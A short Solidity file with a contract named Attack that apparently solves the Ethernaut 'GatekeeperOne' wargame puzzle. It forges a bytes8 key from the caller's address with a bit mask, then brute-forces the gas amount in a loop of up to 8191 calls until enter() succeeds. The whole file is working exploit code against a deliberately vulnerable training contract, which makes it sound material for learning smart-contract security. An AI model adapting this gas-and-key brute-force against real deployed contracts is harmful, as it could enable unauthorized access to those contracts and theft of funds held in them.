// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne{
  function enter(bytes8)external returns(bool);
}
contract Attack{
    function attack(IGatekeeperOne gate)external{
        
        bytes8 key= bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
         for (uint256 i = 0; i < 8191; i++) {
      (bool result,) = address(gate).call{gas: i+(8191 * 3) }(abi.encodeWithSignature("enter(bytes8)", key));
      if(result)
        {
        break;
      }
    }
    }
    
}